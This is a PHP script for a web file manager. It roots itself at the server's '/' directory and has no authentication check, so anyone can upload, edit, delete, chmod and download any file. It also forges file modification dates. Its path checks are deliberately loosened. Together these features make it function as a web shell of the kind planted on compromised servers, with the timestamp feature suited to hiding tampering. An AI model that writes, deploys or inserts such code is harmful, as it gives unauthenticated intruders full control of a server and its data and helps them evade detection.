<?php
// Enable all error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Your existing session code...
// Close any existing sessions first
if (session_status() === PHP_SESSION_ACTIVE) {
    session_write_close();
}

// Start fresh session for file manager
session_name('filemanager');
session_start();



$ROOT = realpath('/');
$reqPath = trim((string)($_GET['path'] ?? ''), "/");
$CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);
if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
    $CURRENT = $ROOT;
    $reqPath = '';
}

/* ==========================
   POST HANDLING (MOVED HERE!)
   ========================== */
   
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = (string)$_POST['action'];
    $targetRel = (string)($_POST['path'] ?? '');
    $targetAbs = fm_safe_target($targetRel);

    switch ($action) {
        case 'delete':
            if ($targetAbs && $targetAbs !== $ROOT && file_exists($targetAbs)) {
                if (is_dir($targetAbs)) {
                    fm_delete_dir($targetAbs);
                } else {
                    @unlink($targetAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'create_file':
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @file_put_contents($newAbs, "");
                }
            }
            header("Location: ?path=" . urlencode($reqPath));
            exit;

        case 'create_folder':
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @mkdir($newAbs, 0755);
                }
            }
            header("Location: ?path=" . urlencode($reqPath));
            exit;

        case 'rename':
            $new = trim((string)($_POST['new_name'] ?? ''));
            if ($targetAbs && $new !== '' && !str_contains($new, '/')) {
                $destAbs = dirname($targetAbs) . '/' . $new;
                if (strpos(realpath(dirname($destAbs)), $ROOT) === 0) {
                    @rename($targetAbs, $destAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'upload':
    error_log("UPLOAD STARTED");
    
    // Check if file was uploaded successfully
    if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
        error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
        header("Location: ?path=" . urlencode($reqPath));
        exit;
    }

    $filename = basename($_FILES['upload']['name']);
    $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
    $destAbs = fm_safe_target($destRel, true);
    
    error_log("Uploading: $filename to $destAbs");
    
    if (!$destAbs) {
        error_log("UPLOAD BLOCKED: Safe target returned null");
        header("Location: ?path=" . urlencode($reqPath));
        exit;
    }

    $tempFile = $_FILES['upload']['tmp_name'];
    
    // Verify temp file
    if (!file_exists($tempFile)) {
        error_log("UPLOAD ERROR: Temp file missing");
        header("Location: ?path=" . urlencode($reqPath));
        exit;
    }

    // Ensure directory exists
    $destDir = dirname($destAbs);
    if (!is_dir($destDir)) {
        mkdir($destDir, 0755, true);
    }

    // Copy with error handling
    if (copy($tempFile, $destAbs)) {
        error_log("UPLOAD SUCCESS: $destAbs");
        // Verify the copy worked
        if (file_exists($destAbs) && filesize($destAbs) > 0) {
            error_log("UPLOAD VERIFIED: File exists with size " . filesize($destAbs));
        } else {
            error_log("UPLOAD WARNING: Copy succeeded but file missing or empty");
        }
        unlink($tempFile);
    } else {
        error_log("UPLOAD FAILED: Copy operation failed");
        error_log("Source readable: " . (is_readable($tempFile) ? 'YES' : 'NO'));
        error_log("Dest writable: " . (is_writable($destDir) ? 'YES' : 'NO'));
        error_log("Last error: " . (error_get_last()['message'] ?? 'Unknown'));
    }

    header("Location: ?path=" . urlencode($reqPath));
    exit;
        case 'download':
            if ($targetAbs && is_file($targetAbs)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($targetAbs).'"');
                header('Content-Length: ' . filesize($targetAbs));
                readfile($targetAbs);
                exit;
            }
            header("Location: ?path=" . urlencode($reqPath));
            exit;

        case 'save':
    $fileRel = (string)($_POST['file_path'] ?? '');
    $targetAbs = fm_safe_target($fileRel);
    
    if (!$targetAbs) {
        error_log("SAVE FAILED: Safe target blocked - $fileRel");
        $saveError = "Security validation failed for path: " . htmlspecialchars($fileRel);
    } elseif (!is_file($targetAbs)) {
        error_log("SAVE FAILED: Not a file - $targetAbs");
        $saveError = "File does not exist: " . htmlspecialchars($fileRel);
    } elseif (!is_writable($targetAbs)) {
        error_log("SAVE FAILED: Not writable - $targetAbs");
        $saveError = "File is not writable. Check permissions: " . htmlspecialchars($fileRel);
    } else {
        $content = (string)($_POST['content'] ?? '');
        
        // Use file locking to prevent race conditions
        if ($handle = @fopen($targetAbs, 'wb')) {
            if (flock($handle, LOCK_EX)) {
                $bytes = fwrite($handle, $content);
                fflush($handle);
                flock($handle, LOCK_UN);
                if ($bytes !== false) {
                    $saveSuccess = "File saved successfully! (" . $bytes . " bytes written)";
                    // Update modification time
                    @touch($targetAbs);
                } else {
                    $saveError = "Failed to write content to file.";
                }
            } else {
                $saveError = "Could not lock file for writing (another process may be using it).";
            }
            fclose($handle);
        } else {
            $saveError = "Failed to open file for writing. Check file permissions.";
        }
    }
    break;

        case 'change_date':
            $newM = (string)($_POST['new_mtime'] ?? '');
            $ts = strtotime($newM);
            if ($targetAbs && $ts !== false) {
                @touch($targetAbs, $ts, $ts);
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        // NEW: chmod feature
        case 'chmod':
            $newPerms = (string)($_POST['new_perms'] ?? '');
            if ($targetAbs && preg_match('/^[0-7]{3,4}$/', $newPerms)) {
                @chmod($targetAbs, octdec($newPerms));
            }
            $parentRel = trim(dirname($targetRel), '/');
            header("Location: ?path=" . urlencode($parentRel));
            exit;
    }
}

/* ==========================
   FILE EDIT VIEW
   ========================== */
if (is_file($CURRENT)) {
    // More permissive file access check
    if (!is_readable($CURRENT)) {
        header("HTTP/1.0 403 Forbidden");
        die("File is not readable: " . htmlspecialchars($CURRENT));
    }
    
    $content = @file_get_contents($CURRENT);
    if ($content === false) {
        header("HTTP/1.0 500 Internal Server Error");
        die("Unable to read file: " . htmlspecialchars($CURRENT));
    }
    
    $fileRel = $reqPath;
    $parentRel = trim(dirname($fileRel), '/');
    
    // Build proper URLs to avoid path issues
    $backUrl = '?path=' . ($parentRel ? urlencode($parentRel) : '');
    $fileUrl = '?path=' . urlencode($fileRel);
    
    $mtime = @filemtime($CURRENT);
    
    // Enhanced save handling
    $saveMessage = '';
    if (!empty($saveSuccess)) {
        $saveMessage = '<div style="background:var(--ok);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveSuccess.'</div>';
    } elseif (!empty($saveError)) {
        $saveMessage = '<div style="background:var(--danger);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveError.'</div>';
    }
    
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit '.htmlspecialchars(basename($CURRENT)).'</title>
    <style>
    :root{--bg:#f5f7fb;--card:#fff;--text:#111;--muted:#6c757d;--pri:#0d6efd;--danger:#dc3545;--warn:#fd7e14;--ok:#198754;}
    body{margin:0;background:var(--bg);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;padding:24px}
    .wrap{max-width:1100px;margin:0 auto}
    .bar{display:flex;gap:8px;align-items:center;margin-bottom:16px}
    .btn{padding:8px 12px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
    .btn.outline{background:transparent;color:var(--pri);border:1px solid #dbe2ea}
    .btn.danger{background:var(--danger)}
    .btn.gray{background:#e9edf3;color:#111}
    textarea{width:100%;height:60vh;border:1px solid #e1e6ee;border-radius:12px;padding:12px;font-family:ui-monospace,SFMono-Regular,Consolas,Monaco,monospace}
    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .card{background:#fff;border-radius:14px;padding:14px;border:1px solid #eef2f7}
    label{font-size:12px;color:var(--muted);display:block;margin-bottom:6px}
    input[type="datetime-local"]{padding:8px 10px;border:1px solid #e1e6ee;border-radius:10px}
    </style></head><body><div class="wrap">';

    echo fm_breadcrumb($reqPath);
    
    // Display save message here
    echo $saveMessage;

    echo '<div class="bar">
            <a class="btn outline" href="'.$backUrl.'"> ← Back</a>
            <form method="post" onsubmit="return confirm(\'Delete this file?\');" style="display:inline;">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                <button class="btn danger" type="submit">Delete</button>
            </form>
            <form method="post" style="display:inline;">
                <input type="hidden" name="action" value="download">
                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                <button class="btn gray" type="submit">Download</button>
            </form>
          </div>';

    echo '<form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file_path" value="'.htmlspecialchars($fileRel).'">
        <textarea name="content" id="fileContent">'.htmlspecialchars((string)$content).'</textarea>
        <div class="bar" style="margin-top:12px;">
            <button class="btn" type="submit" id="saveBtn">Save Changes</button>
            <span style="color:var(--muted);font-size:14px;margin-left:12px;">File: '.htmlspecialchars($fileRel).'</span>
        </div>
      </form>';

    echo '<div class="row">
            <div class="card">
                <form method="post">
                    <input type="hidden" name="action" value="change_date">
                    <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                    <label>Set Modified Date/Time</label>
                    <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i', $mtime) : '').'" step="1">
                    <button class="btn" type="submit" style="margin-left:8px">Update</button>
                </form>
            </div>
          </div>';

    // Add some JavaScript to prevent accidental navigation
    echo '<script>
        let isDirty = false;
        const textarea = document.getElementById("fileContent");
        const saveBtn = document.getElementById("saveBtn");
        
        textarea.addEventListener("input", () => {
            isDirty = true;
            saveBtn.textContent = "Save Changes *";
            saveBtn.style.background = "var(--warn)";
        });
        
        window.addEventListener("beforeunload", (e) => {
            if (isDirty) {
                e.preventDefault();
                e.returnValue = "You have unsaved changes. Are you sure you want to leave?";
            }
        });
        
        document.querySelector("form").addEventListener("submit", () => {
            isDirty = false;
        });
    </script>';

    echo '</div></body></html>';
    exit;
}


function fm_safe_target(string $rel, bool $forCreate = false): ?string {
    global $ROOT;
    
    $rel = ltrim($rel, "/");
    
    // Basic security - block obvious path traversal
    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
        return null;
    }
    
    $target = $ROOT . '/' . $rel;
    
    if ($forCreate) {
        // For create operations - be more permissive
        $parent = dirname($target);
        $parentReal = realpath($parent);
        
        // Allow if parent exists and is within ROOT, or if we can create the parent
        if ($parentReal && strpos($parentReal, $ROOT) === 0) {
            return $target;
        }
        
        // Even if realpath fails, check if the theoretical path is within ROOT
        if (strpos($parent, $ROOT) === 0) {
            return $target;
        }
        
        return null;
    }
    
    // For existing files - MUCH more permissive approach
    if (file_exists($target)) {
        // First try realpath
        $real = realpath($target);
        if ($real && strpos($real, $ROOT) === 0) {
            return $real;
        }
        
        // If realpath fails but file exists, allow it if the path looks safe
        // This handles symlinks, special filesystems, etc.
        if (strpos($target, $ROOT) === 0) {
            return $target;
        }
    }
    
    return null;
}


function fm_perms(string $path): string {
    return substr(sprintf('%o', fileperms($path)), -4);
}


$items = @scandir($CURRENT) ?: [];
$dirs = $files = [];
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    $abs = $CURRENT . '/' . $it;
    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
}
natcasesort($dirs);
natcasesort($files);
$listed = array_merge($dirs, $files);

echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title>
<style>
:root{--bg:#f5f7fb;--card:#fff;--text:#111;--muted:#6c757d;--pri:#0d6efd;--danger:#dc3545;--warn:#fd7e14;--ok:#198754;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;padding:24px}
.wrap{max-width:1200px;margin:0 auto}
h1{margin:0 0 16px;font-size:22px}
table{width:100%;border-collapse:separate;border-spacing:0 8px}
th,td{padding:10px 12px}
tr{background:#fff;border:1px solid #eef2f7;border-radius:12px}
tr td:first-child{border-top-left-radius:12px;border-bottom-left-radius:12px}
tr td:last-child{border-top-right-radius:12px;border-bottom-right-radius:12px}
th{font-size:12px;color:var(--muted);text-align:left}
.name a{color:#0a58ca;text-decoration:none}
.badge{font-size:12px;color:#555;background:#eef2f7;padding:4px 8px;border-radius:20px}
.actions form{display:inline;margin:0 4px}
.btn{padding:6px 10px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
.btn.small{padding:5px 8px;font-size:12px}
.btn.danger{background:var(--danger)}
.btn.warn{background:var(--warn)}
.btn.gray{background:#e9edf3;color:#111}
input[type="text"],input[type="datetime-local"],input[type="file"]{padding:6px 8px;border:1px solid #e1e6ee;border-radius:10px}
.toolbar{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
.icon{margin-right:6px}
.meta{font-size:12px;color:var(--muted)}
.breadcrumb a{color:#0a58ca;text-decoration:none}
</style></head><body><div class="wrap">';

echo fm_breadcrumb($reqPath);

echo '<h1>Browsing: '.htmlspecialchars($reqPath === '' ? '/' : $reqPath).'</h1>';

echo '<div class="toolbar">
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="upload" required>
            <button class="btn small" type="submit">Upload</button>
        </form>
        <form method="post">
            <input type="hidden" name="action" value="create_file">
            <input type="text" name="name" placeholder="newfile.txt" required>
            <button class="btn small" type="submit">Create File</button>
        </form>
        <form method="post">
            <input type="hidden" name="action" value="create_folder">
            <input type="text" name="name" placeholder="New Folder" required>
            <button class="btn small" type="submit">Create Folder</button>
        </form>
        <form method="post" action="?logout=1" onsubmit="return confirm(\'Logout?\');">
            <button class="btn gray small" type="submit">Logout</button>
        </form>
      </div>';

echo '<table><thead><tr>
        <th>Name</th><th>Modified</th><th>Permissions</th><th>Actions</th>
      </tr></thead><tbody>';

foreach ($listed as $name) {
    $abs = $CURRENT . '/' . $name;
    $rel = ($reqPath === '' ? $name : $reqPath . '/' . $name);
    $isDir = is_dir($abs);
    $icon = $isDir ? '&#128193;' : '&#128196;';
    $mtime = @filemtime($abs);
    $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
    $perms = fm_perms($abs);

    echo '<tr><td class="name"><span class="icon">'.$icon.'</span>'.
         '<a href="?path='.urlencode($rel).'">'.htmlspecialchars($name).'</a>'.
         '</td><td class="meta">'.$mtimeStr.'</td><td class="meta">'.$perms.'</td><td>';

    echo '<form method="post" onsubmit="return confirm(\'Delete '.htmlspecialchars($name).'?\');">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <button class="btn small danger" type="submit">Delete</button>
          </form>';

    echo '<form method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <input type="text" name="new_name" placeholder="Rename to" required>
            <button class="btn small warn" type="submit">Rename</button>
          </form>';

    // NEW: chmod form
    echo '<form method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <input type="text" name="new_perms" placeholder="'.$perms.'" pattern="[0-7]{3,4}" required>
            <button class="btn small" type="submit">Chmod</button>
          </form>';

   if (!$isDir) {
    echo '<form method="post">
            <input type="hidden" name="action" value="download">
            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
            <button class="btn small gray" type="submit">Download</button>
          </form>';
}

// Date modification form for BOTH files and folders (moved outside the if condition)
echo '<form method="post" style="margin-top:6px">
        <input type="hidden" name="action" value="change_date">
        <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
        <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
        <button class="btn small" type="submit">Set Date</button>
      </form>';

    echo '</td></tr>';
}

echo '</tbody></table>';

echo '</div></body></html>';

function fm_delete_dir(string $dir): bool {
    if (!is_dir($dir)) return false;
    foreach (array_diff(scandir($dir), ['.','..']) as $f) {
        $p = "$dir/$f";
        if (is_dir($p)) fm_delete_dir($p); else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_breadcrumb(string $relPath): string {
    $parts = array_filter(explode('/', $relPath));
    $acc = '';
    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
    foreach ($parts as $p) {
        $acc .= ($acc ? '/' : '') . $p;
        $html .= ' / <a href="?path=' . urlencode($acc) . '">' . htmlspecialchars($p) . '</a>';
    }
    $html .= '</div>';
    return $html;
}
